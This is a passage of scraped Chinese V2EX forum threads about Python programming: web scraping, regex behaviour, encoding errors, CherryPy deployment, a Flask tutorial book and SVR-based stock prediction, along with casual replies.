用量化模型来管理各种多样化的股票投资组合。 90 年代， AXA 罗森伯格的资产管理规模突破 100 亿美元。</p>\n<p>遥想当年， Barra 在 AXA Rosenberg 那可真的是一手遮天，典型的一言堂。尤其 90 年代末期，出色的基金表现令 Rosenberg 经常无视总部 AXA 的命令。然后，盛极而衰，金融危机爆发， Barra Rosenberg 被人发现了模型的一个问题，造成了 2.17 亿美元的损失，在内部权利斗争下不仅丢掉了饭碗，还支付了 250 万美元给 SEC ，最后被美国 SEC(证监会）终身禁止从事投资业务。</p>\n<p>这么厉害的文，写了好几个世纪，觉得好厉害！</p>\n<p><strong>新鲜出品:<a href=\"https://www.ricequant.com/community/topic/1599/?utm_source=v2ex\" rel=\"nofollow\">https://www.ricequant.com/community/topic/1599/?utm_source=v2ex</a></strong></p>\n</div></div>"], "reply": "1", "tittle": "风险到底是个什么东西？(一)", "comment": ["风险，就是不确定性。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>向各位大大问个小白问题，没用过 CherryPy ，今天在网上下载了一个 CherryPy 的项目到服务器上，可以在本地 127.0.0.1 访问，请问怎么部署到互联网给别人访问呢？</p>\n</div></div>"], "reply": "5", "tittle": "CherryPy 的应用怎么部署到互联网给别人访问", "comment": ["不考虑安全性，架构，用户量和架构等等一系列事情，只为了让互联网上的人访问。需要让网络管理员映射一个公网 IP 地址的端口到这台服务器上 cherrypy 启动时监听的端口上就可以了。\r", "\r", "目测，你的这个 cherrypy 项目启动使用了默认的 80 端口，则让你的网络管理员映射公网 IP 地址的 80 端口到你这台部署 cherrypy 项目的服务器内网 IP 地址的 80 端口，把公网 IP 地址告诉你想要访问的人， 通过 ", "\r", "如果你们有固定公网 ip 地址的话，就是这样做。没有固定公网 IP 地址的话，就涉及到公网 IP 地址可能会变或者 DDNS 巴拉巴拉一系列其他的事情.....", "我来回答“如果你们有固定公网 ip 地址的话，就是这样做。没有固定公网 IP 地址的话，就涉及到公网 IP 地址可能会变或者 DDNS 巴拉巴拉一系列其他的事情.....”之后的事情吧\r", "1.只有 NAT 之后的 10.x 或者 100.x 形式的内网地址\r", "服务器端实现的方式： ngrok 俗称内网穿透 具体可以看看 ", "\r", "路由器端实现方式： 花生壳 or ngork or xTunel 等 类似于服务器端的设置\r", "2.有动态 IP 即 PPPoE 拨号方式（基本上封了 80 端口）\r", "可以选择上 https ， 443 端口应该是好的\r", "或者路由器设置 81 端口（或者其他 xx 端口）对应映射内网服务器的 80 端口", " 有固定外网 ip ，租的 vps ，前几天下了个 CherryPy 的项目，在本地访问 127.0.0.1:8080 可以访问，但是用公网 ip 访问就不行，不知道是不是要用 nginx 什么的才能实现外网访问，没接触过这个", " 找到原因了，是自己配置错了、、、感谢回答", " 恩 iptables 的设置和 nginx 的绑定都有可能出问题"]},
{"content": "", "reply": "39", "tittle": "chuansong.me 这网站一直都是采集的微信公众号的文章，这种采集是如何实现的那？采集的来源是哪里那？", "comment": ["这个网站要发财了\r", "\r", "chuansong.me 的站点信息\r", "备案信息：浙 ICP 备 15001855 号-1(个人备案)\r", "该网站共有 2,061,848 个网页被百度收录\r", "\r", "按这种收录数，每天至少 10-15 万独立 IP 访问\r", "而本人什么都不用干，就给服务器钱就可以了\r", "\r", "牛！", "什么叫躺着挣钱？ 一句话，牛逼\r", "\r", " ", "只可惜格局还是小了点，这种数量文字的索引量，如果把平时收入的 1/3 拿出来买大站的链接。中文网站前三名都能做上去的", "其实这功能应该由微信提供，我就不信只有我一个人喜欢在电脑上看公众号。", "牛逼。做些技术苦力外包 不如自己搞些项目。", "记得以前发网站上来就会被 DDOS ，这不是害人家么", "mark  这个站关注很久了", "估计站长想打死你了。。。 hhh", " 贴图的查询网站是？", " ", "\r", "记得作者之前在 weibo 说会分享，但后来就没消息了。", "企鹅会不会报警抓人？", "首发就在 V2EX 233\r", "站长就在 V2EX @", "发现备案号都查询不到呀", "采集站的收录量也能这么高。。。？", " ", " 腾讯投资了搜狗，这个就是微信公众号官方的 WEB 展示页面", " 去后缀为 gov.cn 查询", " 竟然出现过我。哈哈", "微信公众号文章采集，，，年初的时候，我见过有人卖过源码。\r", "而且微信公众号文章采集，，收录过亿的都有。。。具体你可以百度。\r", " 这个和现在百度的算法有关，，，很多时候原创（当然高质量原创另说）的确敌不过采集，，我自己的站就是。", "不定时采集吗？腾讯不封？", "学会一种新思维, 谢谢楼主", "别跑题啊\r", "我也好奇这块采集怎么处理的\r", "有大牛讲解下么", " 站长把域名注册人都隐藏了，显然是对此方法可能造成的“法律风险”做了一定的规避\r", "不过三年能做到这种流量，很不错了", " 的确，这种网站闷声赚钱是最好的", "\r", "之前 v 站不是有人分享过他这个项目么", "好奇这个网站是手动收录的吗？", "很久以前问过他本人，就是他没透露。 他做的比搜狗的要早。", "页面上没有广告，流量如何变现？", " 醉了 没广告？、你确定？肯定是浏览器有屏蔽插件 吧，一个页面上 好些广告的", "不过我个人觉得这个站不错啊\r", "至少像我这种不用微信的人来说还是很方便的。", " 的确是发财了 闷声发大财啊", "  那么杂感谢我那。。哈", "支持 D 一下 微信公众号盗抄 这个盗抄公众号。。。", "垃圾采集站 以偷东西为生", "微信生态封闭，简直是自食其果。", "据我所知，早期的一些直接采微信的采集方法均已失效，这个网站可能有内部资源（我不认识作者，纯猜测）。", " 同感，手机看着太累了，图片加载也慢。", " 看代码 是采集的 ", "   这似乎不是   chuansong.me 应该是直接采集的 微信数据才对吧", "神箭手云爬虫上有现成的微信公众号文章批量采集爬虫，不用自己开发，点开始就自动开始采集。 "]},
{"content": "", "reply": "13", "tittle": "请问大家有什么从入门到精通的 python 爬虫教程", "comment": ["web scraping with python", "Python 网络数据采集\r", "\r", "看完入门没问题。很薄的一本书", "《 python 网络数据采集》《图解 HTTP 》\r", "两本小册子，看完多练习下", "前三楼说的都是同一本书，所以别犹豫了。。。", "Web Scraping with Python +1\r", "不长，一天翻翻就能写个爬虫了，妥妥的", "现在的爬虫难点已经不是架构本身了\r", "每个网站的防爬取都够玩一下的\r", "最简单的，先学着自己解决验证码吧", "然而有两本不同的 web scraping with python ，一本是 O'Reilly 的，一本是 PACKT 的", "实例 ", " 搞事情 :-)", "谢谢大家了，但是《 python 网络数据采集》《图解 HTTP 》这两本书在哪里买呢？", " JD 当当 amazon     顺便再推荐个 《提问的智慧》", " 您好，我想问下你的网站怎么打起来的。挺好看，我想模仿一个。", "我也想学 mark", "  我看了看应该是用的 hexo+上主题吧 你去查查 不困难"]},
{"content": ["<div class=\"topic_content\">import re\r<br>    a='abcabc'\r<br>    b=re.search( r '(\\d)abc(?(1)\\d|abc)', a )\r<br>    print(b)\r<br>#为何匹配失败？ a='3abcabc'也是如此！\r<br>查了下(?(1)\\d|abc)  的意思：如果编号为 1 的组匹配到字符，则需要匹配\\d ，否则需要匹配 abc.\r<br>这里的 1 匹配到字符是指 c 后面匹配到字符呢还是 a 前面匹配到数字字符？</div>"], "reply": "21", "tittle": "正则表达式疑问", "comment": ["a='3abc3abc'成功\r", "答案： 1 是 a 前面匹配到数字字符", "看后面的判断，你可能需要的表达式是  r'(\\d)?abc(?(1)\\d|abc)' ，你的表达式只有编号为 1 的组匹配到字符的情况，没有匹配不到的情况。\r", "···\r", ">>> re.search(r'(\\d)?abc(?(1)\\d|abc)', 'abcabc').group()\r", "'abcabc'\r", "···", " \r", "从概念上说， 1 确实是对第一个分组的匹配文本的引用。\r", "这样问更准确：后面管道符 | 的左右两个子表达式选择时的判断依据是什么？是最前面的分组是否成功匹配（\\d)，还是 c 字符后面是否成功匹配（ 1 ）? 虽然最前面有数字字符（成功匹配了分组），但 c 后面仍然可能没有数字字符", " \r", "从这里看判断依据应该是 a 前面的分组是否匹配成功，而不是 C 后面的后向引用是否匹配", " 这个理解有问题，困惑中", "'2abc1abc'  ： 这也能匹配成功？！！！\r", "难道（ 1 ）是引用的'\\d'本身，而不是对其匹配结果的引用？ 这与  \\1 明显不同", "这个问题来自此地址上图片的最末端\r", "(1) 是判断 (\\d) 是否匹配成功；\r", "是，则接着尝试匹配 \\d ，这跟捕获组 1 已经没有关系了，就是单纯的 \\d ；\r", "否，则尝试匹配 abc ，这就没有意义了，因为既然 (\\d) 没有匹配到，那后面再怎么尝试，整个匹配式都是不匹配的，所以应该是 2 楼说的，正则表达式写错了，不是 (\\d) 而是 (\\d)?，它能匹配任何字符。", "更正，原表达式中的 (\\d) 一旦匹配失败，就没有后面的尝试了，因为一个正常的正则引擎已经可以判断在这个位置整个表达式匹配都失败了。", " '2abc1abc' 能匹配成功是因为你用的是 search ，匹配的是 '2abc1'", "推荐这个： ", "\r", "\r", "另外还有一个可视化的工具。（但是刚才搜了一下没搜到。。。）", "If Clause (?(1)\\d|abc)\r", "Evaluate the condition below and proceed accordingly\r", "(1) checks whether the 1st capturing group matched when it was last attempted\r", "If condition is met, match the following regex \\d\r", "\\d matches a digit (equal to [0-9])\r", "Else match the following regex abc\r", "abc matches the characters abc literally (case sensitive)", " 谢谢\r", "这句是什么意思：\r", "If Clause (?(1)\\d|abc)", "google 翻译：\r", "如果条款（？（ 1 ）\\ d | abc ）\r", "评估以下条件并相应地进行\r", "（ 1 ）检查第一捕获组是否在最后一次尝试时匹配\r", "如果条件满足，匹配以下正则表达式\\ d\r", "\\ d 匹配数字（等于[0-9]）\r", "否则匹配以下正则表达式 abc\r", "abc 匹配字符 abc 字面上（区分大小写）", " \r", " 这样一改就好理解了，茅塞顿开", "这个有点奇怪，会回退去匹配\r", "re.search(r'(\\d)?abc(?(1)\\d|abc)',  '2abcabc')\r", "结果为：‘ abcabc'\r", "  当经过(1)判断，进行第 2 个\\d 匹配，失败后居然回到第一个 a 处重新开始又一次的正则式匹配，难道前面的匹配只有分组消耗字符？？？", " ", " \r", "并没有退回，条件表达式 (?ifthen|else) 匹配失败所以自然没有消耗字符。", " 那也应该从第 2 个 a 开始，不是吗", " \r", "因为条件表达式匹配失败，所以整个正则式在索引 0 匹配失败，所以挪到索引 1 进行匹配。", " 正则表达式可视化"]},
{"content": "", "reply": "28", "tittle": "境外服务器上部署爬虫抓 YouTube（下载视频）， YouTube 会不会封 IP？", "comment": ["本人反代 YouTube ，然后用户就被验证码拦了", "每次打开会有验证码", " \r", " \r", "YouTube 反爬比较严格，在阿里云香港服务器上部署了爬虫，刚开始可以抓一些。现在程序直接报错。", "封 ip 那是轻的", "  请问有 YouTube 具体的反爬技术介绍吗？", " 可以尝试使用代理，建立个代理池，", "做爬虫代理池不应该是标配吗。。", "  1 ，代理稳定性一直是个问题（付费的 vpn 稳定性也很不好，一直在用付费代理）， 2 ， youtube 封 ip 是封死的。", "当然会", "代理池是标配", "gg 是世界上最大的爬虫公司   当然反爬技术也是炉火纯青了", "  能感觉到反爬技术很牛逼。另外你的头像是 272 ？", " 嗯", "表示 ", "  一只很好用，干嘛要自己搞个什么东西爬视频～～～～", "一直用的它提供的 API 接口爬视频然后下载的，跑了很长时间了，貌似没被限制过 ip", "以前爬过几千个视频，没有出现问题", " 能具体说说你的方法不？", "爬 youtube 啥意思啊，如果想单纯的下载视频的话用 you-get 或者 youtube-dl 两个软件都可以下啊，我下载几百个视频都不会有别的问题的。也可能我不理解你的意思", "  客户需要 youtube 新闻类的视频，我是把 you-get 集成到程序中，爬虫拿到网页链接后交给 you-get 去下载视频，现在 youtube 把 ip 封掉了。", "youtube-dl 单 ip 下了十万个视频还没被封，可能是运气好", "有接口尽量用接口，只要不是特别频繁调用接口，一般不会封，但是模拟前台抓取页面这种，貌似会封的比较厉害", " 有相关文档不？", " youtube-dl 没被封", "不要随便传播哦，否则要喝茶的", " 这个不错", "google 和 youtube 这一套体系的反爬都比较完善，门槛比较高了，但要爬仍然能爬", "   ", "  能用上么？", "盯上 youtube 人太多了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>老实说题目暂时没刷多少，先写个自动下载代码并生成自动生成 Readme 的工具方便发布到 Github</p>\n<p>详情见 <a href=\"https://github.com/bonfy/leetcode\" rel=\"nofollow\">https://github.com/bonfy/leetcode</a></p>\n<p>前方预警，注意里面的 <a href=\"http://leetcode_generate.py\" rel=\"nofollow\">leetcode_generate.py</a></p>\n<p>无图无真相</p>\n<p><img alt=\"\" src=\"http://7i7k6w.com1.z0.glb.clouddn.com/leetcode.gif\"></p>\n</div></div>"], "reply": "11", "tittle": "Leetcode 刷题神器，妈妈再也不用担心我刷题后代码同步到 Github 的问题了", "comment": ["虽然看起来很厉害, 但是这个究竟是干什么的?", "  用来下载自己写过的 solution", "mark", " @", " 楼上正解，握爪", " 哦 这样的话 看起来还不错", "挺方便的，谢谢楼主", "看了楼主的工具，去完成了我的第一道题目 ", " ", " :smiley:", " wakaka", "目前只做了 20 道", " 我也只做了一点点， 慢慢来嘛 :)"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>2 年经验的 PHPer ，因为需要运维自己的博客服务器，想学 shell 或 python3</p>\n<p>但是 shell 语法实在太奇葩，记不住。决定学 python3</p>\n<p>目前基础已入门，想做点小项目练练手，但一时想不到做啥好，请各位指教</p>\n</div></div>"], "reply": "13", "tittle": "请问下 2 年经验的 PHPer 想学 Python3，做点什么小玩意儿练手比较好？", "comment": ["可以先从这个入手，都是一些工作中可能遇到的需求，比什么打印杨辉三角不知道高到哪里去了\r", "\r", "\r", "进阶版：\r", " 好东西，收了，感谢！", "没有人专门学 shell 的。。。。但是如果要操作 Linux 服务器， shell 又多少要会一点。", "我记得这几天在刷头条的时候老有 Python 入门练手项目列表什么的冒出来, 这样子的话我觉得网上应该很常见, 找个来练手刷一遍就好了嘛\r", "\r", "我记得当年我是写了个 console 的看小说程序开始练手的", "PyQt", "做个翻墙", "既然是 php er 可以看看 django 。。", "都写了两年代码额难道不觉得语言都一样。你应该看 python 的最佳实践。", "龙霆挖坑了", "根据需求吧，没有需求就创造需求", "帮我做个项目吧，给你十块钱，先写个爬虫，爬豆瓣， 用 postgresql     python3   写好后私聊发源码和你支付宝给我", "帮我做个项目吧。给你 1 块钱。把微信公众号的文章爬出来。谢谢。这样就有事做了。", " 沃日，居然还有人认得我！？"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://www.cnblogs.com/huxi/archive/2010/07/04/1771073.html\" rel=\"nofollow\">http://www.cnblogs.com/huxi/archive/2010/07/04/1771073.html</a>\r<br>这个网址上说不消耗字符，但，实验了下，好像并不如此：\r<br> \r<br>import re\r<br>    a='set 2ddp'\r<br>    b=re.search(r'(?=set).*',a)\r<br>    print(b.group(0))    # 此处完整输出 a  这个是真正的不消耗字符\r<br>   b=re.search(r'(?&lt;=set).*',a)\r<br>    print(b.group(0))    # 此处输出：'  2ddp'</div>"], "reply": "8", "tittle": "正则表达式 （?<=exp) 消耗字符吗？", "comment": ["JavaScript 好像不支持，无法可视化", "look around 匹配的是位置，(?<=set)正好匹配在 set 后的空格开始位置", "不消耗，所有特殊组都不消耗字符串。\r", "\r", "拙作： ", "(?=set) 是从 set 之前开始匹配；\r", "(?<=set) 是从 set 后面开始匹配。", "look around 属于零宽断言，不消耗字符。\r", "JavaScript 只支持 look ahead ，不支持 look behind 。", "这样理解：\r", " 所说的之前之后，都有一个定点，即当前位置。在当前位置前后预查满足要求后，就在这个定点处开始真正的匹配", "这是 lookbehind ，基于当前位置；所以不存在消耗字符与否这个说法，根本就没有字符可以“消耗”。", "只是预测而已，不会匹配到"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我的系统为繁体中文 Win7 64bit / Python35 (32bit)<br>\n不知道为何下列程序,遇到简体,执行后会有错误.<br>\n请问该怎解决呢?</p>\n<p>程序码</p>\n<pre><code>from urllib.request import urlopen\nfrom bs4 import BeautifulSoup\nhtml = urlopen(\"http://home.baidu.com/\")\nsoup = BeautifulSoup(html , \"lxml\")\nprint(soup.title);\n</code></pre>\n<p>错误如下</p>\n<pre><code>C:\\py&gt;hellokitty.py\nTraceback (most recent call last):\n  File \"C:\\py\\hellokitty.py\", line 5, in &lt;module&gt;\n    print(soup.title);\nUnicodeEncodeError: 'cp950' codec can't encode character '\\u5173' in position 7:\n illegal multibyte sequence\n</code></pre>\n</div></div>"], "reply": "26", "tittle": "Python3 编码问题", "comment": ["这种一般都是 windows 的锅， cmd 太蛋疼了，自己建个虚拟机跑吧", "建议用 IDLE ，别用蛋疼的 cmd 。", "或者先在 CMD 执行这个 chcp 65001", "Windows 控制台默认使用目前系统编码，对于繁体中文是 Big5/cp950 。 Python 在 print 一个字符串之前，需要编码到目前 cmd 窗口使用的编码，而你遇到了个（ Python 印象中的） Big5 没有的字符。（之所以强调可能是 Python 的错觉，是因为这个语言的官方实现对于编解码的实现经常拘泥“标准”到脱离现实的地步： cp936 直接指到 gbk 结果没有该有的欧元符号、 cp950 没有 HKSCS 支持……）\r", "\r", "你可以使用 chcp 65001 切到 utf-8 控制台窗口，当然也可以像楼上建议的一样走路绕开 Windows 控制台。", "import \r", "\r", "try:\r", "    reload(sys)\r", "    sys.setdefaultencoding(\"utf-8\")\r", "except:\r", "    pass\r", "\r", "试一下看看", " Python3 没有 reload 吧", "不要在 win 下搞这些，你会生不如死", "如果不想去动 CMD, 且控制台输出仅做简单观测可以这样:\r", "\r", "# -*- encoding: utf-8 -*-\r", "\r", "import locale\r", "lc = locale.getpreferredencoding()\r", "\r", "s = 'GBK 控制台不能完全显示的表情(*●⁰♊⁰●)ﾉ'\r", "\r", "\r", "def show_msg(msg):\r", "    # print(msg)  # 注释掉后: UnicodeEncodeError: 'gbk' codec can't encode ...\r", "    print(msg.encode(lc, 'ignore').decode(lc))\r", "\r", "show_msg(s)  # GBK 控制台不能完全显示的表情(*●●)\r", "\r", "这将忽略掉本地编码不能显示的字符, 如果要精确记录就用 utf8 编码输出到文件", "别用 win 写 python 我就遇到这个坑，没解决，后来又遇到许多安装包无法安装的坑，解决了一部分\r", "最后的解决方法\r", "装了个 ubuntu 。。。\r", "真心的装个 linux 吧不然后面会遇到更多的坑的", "感谢各位协助~因刚买了一本网路采集在学 py,问题比较多.\r", "\r", "再请问下,难道 python 抓取的 html 含有简体 /繁体\r", "一定都得在 IDLE 上运行,才不会有编码的问题吗?\r", "\r", "不知道是否有没通用的方法,不用經過 chcp 65001 ,让 CMD 可以顺利显示各种语言.\r", "这样脚本给别人,在 win 运行也方便.", "不是混充跨平台码？\r", "\r", "看到大家说换到 linux 上。我之前，在 win 上写脚本，脚本功能是想 move 一些文件。然后，目录是中文。\r", "问题：如果我的 php 脚本是 utf8 编码，那没效，因为目录名包含中文， win 上是 gbk 编码\r", "最后我的解决方案是，在 linux 上挂在 win 解决。大家有其他解决方案码？", "“给别人用”本身就不方便，别人还要配相同 py 环境\r", "不同 win 的 codepage 编码就更加了\r", "\r", "通用方法\r", "1.统一环境开发\r", "2.程序内部做兼容转码\r", "3.统一使用环境（ cmd 注册表改成 65001 ），但这个影响用户其他 cmd 使用\r", "4.win10/ bash on ubuntu on windows", " \r", "我就是 win 从 php4 等到 php5.3 都没有 unicode 处理目录，才开始学 python 的", " @", "\r", "加上 from importlib import reload 基本上就是楼主需要的答案\r", "\r", " 你说的方案在大多数场景下很好用，但不适合楼主。他的系统代码页是繁体，会导致很多简体字显示不出来，而不只是几个无关紧要的符号", "Windows 默认命令行的锅，用 PowerShell 吧。", " 所以， python 能完美解决这个问题是么？我去试试", " \r", "补充一下，是 py3 ， py3 读取多字节 win 路径是返回 utf-8 的，无需使用 win 的相关模块\r", "\r", "这个知识不知道是否过时：\r", "win 系统编码很复杂，例如 win 是 cp936(接近于 gbk)编码，如果一个路径含有中文、英文、韩文，它是一个混合编码，一般需要一些 win 相关的模块处理\r", "py3 能统一返回 utf-8", " 同病相怜,借地方求助下", "关键的一句\r", "sys.setdefaultencoding(\"utf-8\")\r", "剩下的自已查手册文 档就行了", " 我觉得在 win 下调试代码最好还是用虚拟机， bash on ubuntu on win 应该也能解决这个问题，不过我没用过，好多人用过都说不错，可以在 win 上跑很多 linux 的东西了", " 你是下载个 pycharm 社区版的 免费。功能够用。 能省很多事。", " 感谢,目前使用 IDLE (Python 3.5 32-bit).", " chcp 65001 *就是* 你在找的通用方法，句号。\r", "\r", " 人生苦短，多手动用 u\"你好中文\"（当然用 __future__ unicode_literals 也是好事。）", "解决响应文本编码问题, 用 requests 包更方便\r", "\r", "import requests\r", "from bs4 import BeautifulSoup\r", "html = requests.get(\"http://home.baidu.com/\")\r", "soup = BeautifulSoup(html.content.decode('utf-8'), \"lxml\")\r", "print(soup.title);", " \r", "这还是不能,\r", "你的系统是简体,你去抓个繁体网页看看.\r", "应该会出错.", "see "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>11 月 15 日更新</p>\n<hr>\n<p>书籍链接: <a href=\"https://github.com/ethan-funny/head-first-flask\" rel=\"nofollow\">https://github.com/ethan-funny/head-first-flask</a></p>\n<p>大概两个月前，楼主发布了本书的第 1 版，在这里，收到了你们不少良好的建议和意见。后来，我抽空进行了完善，增加了工厂方法、蓝图和 一些常用的 Flask 插件等章节。</p>\n<p>本书的写作开始于 2016 年 7 月，当时的初衷就是想把学的东西记录下来，但是比较分散，后来想到可以把它写成一本开源的电子书，何乐而不为？可是真正写的时候，才发现写书真的好费精力。但不管怎样，最后还是写了一些东西。</p>\n<p>目前本书主要分为五个章节：</p>\n<ul>\n<li>第 1 章：介绍 Flask 的安装和快速使用。</li>\n<li>第 2 章：介绍 Flask 的基本使用方法，比如路由和视图，静态模板，蓝图和工厂方法等。</li>\n<li>第 3 章：介绍 Flask 常用扩展插件的使用方法。</li>\n<li>第 4 章： Flask 实战，介绍了如何开发一个简单的 Web TODO 应用。</li>\n<li>第 5 章：结束语，包含一些相关的参考资料以及资源推荐。</li>\n</ul>\n<p>最后，希望本书对你有所帮助，谢谢。</p>\n</div></div>"], "reply": "10", "tittle": "Flask Web 开发笔记 gitbook 更新了~", "comment": ["写东西是挺累的   收藏了", "恩，又是我。这次不打击了。赞一个，可以做入门的教程了。\r", "\r", "BTW ，看了下，项目结构略乱。恩，应该说几个章节不一致。 \r", "建议看看这篇文章 ", "\r", "\r", "或者去我博客看我那篇未完成的译文。(逃", " ，学习了，谢谢~", "mark", "mark \r", "\r", "bd ，已 star ，晚上回家了准备按照教程试试。", "可以考虑再增加一点常用的 flask 插件的使用，比如 flask-login 或者 flask-socketio", " ，好的，后面我会考虑的，谢谢建议", "亲， web 阅读的时候，翻页体验不太好，我找了半天才找到左侧的翻页按钮，建议左侧增加目录", " ，咦，不是有目录码？![]( ", ")"]},
{"content": ["<div class=\"topic_content\">之前发过一篇：涨跌幅度分级，使用 SVM 分类预测 <a target=\"_blank\" href=\"https://uqer.io/community/share/57ff4e54228e5b3658fac3f5\" rel=\"nofollow\">https://uqer.io/community/share/57ff4e54228e5b3658fac3f5</a> ，受欢迎程度颇高哈。今天就再发一篇和机器学习相关的模型——利用 SVR 模型来预测股票开盘价。\r<br>一、策略概述\r<br>\r<br>本策略主旨思想是利用 SVR 建立的模型对股票每日开盘价进行回归拟合,即把前一日的 ['openPrice','highestPrice','lowestPrice','closePrice','turnoverVol','turnoverValue'] 作为当日 'openPrice' 的自变量，当日 'openPrice' 作为因变量。 SVR 的实现使用第三方库 scikit-learn 。\r<br>\r<br>二、 SVR\r<br>\r<br>SVR 详情 \r<br>SVR 参考文献见下方： <a target=\"_blank\" href=\"https://uqer.io/community/share/5646f635f9f06c4446b48126\" rel=\"nofollow\">https://uqer.io/community/share/5646f635f9f06c4446b48126</a>\r<br>\r<br><a target=\"_blank\" href=\"/i/B3rk0J5Ol.png\" title=\"在新窗口打开图片 B3rk0J5Ol.png\"><img src=\"//i.v2ex.co/B3rk0J5Ol.png\" class=\"embedded_image\"></a>\r<br>\r<br><a target=\"_blank\" href=\"/i/mD0owg6wl.png\" title=\"在新窗口打开图片 mD0owg6wl.png\"><img src=\"//i.v2ex.co/mD0owg6wl.png\" class=\"embedded_image\"></a>\r<br>\r<br>代码请参考： <a target=\"_blank\" href=\"https://uqer.io/community/share/5646f635f9f06c4446b48126\" rel=\"nofollow\">https://uqer.io/community/share/5646f635f9f06c4446b48126</a>\r<br>三、 PS\r<br>\r<br>原本使用前一天数据预测当天的，但在 Quartz 中，交易策略被具体化为根据一定的规则，判断每个交易日以开盘价买入多少数量的何种股票。回测不影响，但在使模拟盘时无法获取当天的 closePrice 等，所以将程序改为用地 n-2 个交易日的数据作为自变量，第 n 个交易日的 openPrice 作为因变量。\r<br>股票筛选的方法还很欠缺，本程序只用了'去除流动性差的股票'和'净利润增长率大于 1 的前 N 支股票'分别进行股票筛选测试，个人感觉都不很理想，还希望大牛们能提供一些有效的筛选方法。\r<br>对于股票指数来说，大多数时候都无法对其进行精确的预测，本策略只做参考。\r<br>期间发现通过 get_attribute_history 与 DataAPI.MktEqudGet 获取的数据中，有些股票的数据存在一些差异。\r<br>关于止损，同样的止损策略，在其他平台可以明显看到，但在 Uqer 感觉并不起作用，不知是不是代码编写存在错误？还望大牛指正。\r<br>程序写的有点乱七八糟的，还望大家见谅，多有不足还望指导！\r<br>References:\r<br>“ A Tutorial on Support Vector Regression ” Alex J. Smola, Bernhard Schölkopf -Statistics and Computing archive Volume 14 Issue 3, August 2004, p. 199-222\r<br>代码请参考： <a target=\"_blank\" href=\"https://uqer.io/community/share/5646f635f9f06c4446b48126\" rel=\"nofollow\">https://uqer.io/community/share/5646f635f9f06c4446b48126</a>\r<br>\r<br><a target=\"_blank\" href=\"/i/Qc01YvJal.png\" title=\"在新窗口打开图片 Qc01YvJal.png\"><img src=\"//i.v2ex.co/Qc01YvJal.png\" class=\"embedded_image\"></a></div>"], "reply": "14", "tittle": "使用 SVR 预测股票开盘价 v1.0", "comment": ["棒~", "这个有沟通交流群之类的不？", "准不准，发财了没？", "我好奇知道准不准？", "准的话  还会来发帖 找人填坑啊", "软文而已", " 恩恩，有， ", "仁者见仁，智者见智吧：）", "哈哈哈哈红红火火恍恍惚惚", "珍爱生命，远离 A 股", " 哈哈，说得好，去年股灾就没多过，所以今年想用更理性的方法研究研究，还个本：）", "训练后的模型，支持向量占比多大？这是衡量模型复杂度和有没有过拟合的关键点噢", " 看来是砖家", "我猜想你是按照预测出的价格大于当前价格，你就买入，如果低于，你就卖出。\r", "\r", "你可以试试不按照这个来，每次随机的买入和卖出，看看是不是效果差不多。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>求推荐</p>\n</div></div>"], "reply": "2", "tittle": "有木有实时展示数据的 python 框架？", "comment": ["django channel ?", "graphite + carbon"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>记遇到的一个问题:[Errno 104] Connection reset by peer<a></a></h1>\n<p>今天工作上有个需求，数据库有个表有将近 3 万条 url 记录，每条记录都是一个图片，我需要请求他们拿到每个图片存到本地。一开始我是这么写的(伪代码):</p>\n<pre><code>import requests\n\nfor url in urls:\n    try:\n        r = requests.get(url).content\n        save_image(r)\n    except Exception, e:\n        print str(e)\n</code></pre>\n<p>然而在服务器上运行时, 会发现每隔一些请求会报类似下面的错误:</p>\n<pre><code>HTTPConnectionPool(host='wx.qlogo.cn', port=80): Max retries exceeded with url: /mmopen/aTVWntpJLCAr2pichIUx8XMevb3SEbktTuLkxJLHWVTwGfkprKZ7rkEYDrKRr5icyDGIvU4iasoyRrqsffbe3UUQXT5EfMEbYKg/0 (Caused by &lt;class 'socket.error'&gt;: [Errno 104] Connection reset by peer)\n</code></pre>\n<p>这让我想起了之前通过<a href=\"https://github.com/HackerNews/API\" rel=\"nofollow\">hacker news api</a> 在自己电脑上请求一条一条数据时，为了加快处理速度，采用多进程的方式请求接口，也会出现这样的错误。之前我是做了错误记录直接 pass 了，这次情况下因为需要请求所有图片，在 google 查了相关原因，大概是因为我频繁请求，服务器关闭了部门请求连接。参见<a href=\"http://stackoverflow.com/questions/1434451/what-does-connection-reset-by-peer-mean\" rel=\"nofollow\">这里</a>， <a href=\"http://stackoverflow.com/questions/20568216/python-handling-socket-error-errno-104-connection-reset-by-peer\" rel=\"nofollow\">这里</a>， <a href=\"http://www.itmaybeahack.com/homepage/iblog/architecture/C551260341/E20081031204203/index.html\" rel=\"nofollow\">这里</a>。\n所以我粗暴地这么做，还真解决了：</p>\n<pre><code>import requests\n\nfor url in urls:\n    for i in range(10):\n        try:\n            r = requests.get(url).content\n        except Exception, e:\n            if i &gt;= 9:\n                do_some_log()\n            else:\n                time.sleep(0.5)\n        else:\n            time.sleep(0.1)\n            break\n\n     save_image(r)\n</code></pre>\n<p>代码很简陋，但可以说明大体解决方案，在每个请求间增加延时可以减少大部分请求拒绝，但还是存在一些请求被拒绝的，所以在那部分请求被拒绝后，发起重试，在被拒 10 次后才善罢甘休（记录到日志）。在实际的请求中，加了 0.1s 的延迟被拒绝的情况明显少了很多，被拒绝重试的次数最多为 3 次，最后成功地取下了全部图片。</p>\n</div></div>"], "reply": "9", "tittle": "python requests, 记遇到的一个问题: [Errno 104] Connection reset by peer", "comment": ["除了睡觉还有什么不简单的解决方式呢？楼下的说说？", " 没有什么是睡一觉不能解决的，如果有，那就睡两觉", "。。。。。", "整个 ip 池，头部也多整几个。换来换去应该就可以了。", "最近在做一个类似的爬虫，遇到一个问题就系假若数据库里面有个图片 url 被屏蔽了， 404 ，怎么跳过这条 URL 或者重新下载这个图片。\r", "\r", "我目前状况是要么卡死，设置 timeout 也是抛出异常然后就中断了，没法进去进行下载", " 有道理啊，改天找机会试试", " 不太明白你遇到的问题，既然知道 404 了，是没做相应的异常处理？", " 额我是新手， try.except 了，但是依然中止了。\r", "\r", "    for img in range(len(img_name)):\r", "        try:\r", "            img_data = request.urlopen(img_add[img], timeout=5).read()\r", "        except Exception as e:\r", "            print(img_name[img] + '下载失败' + 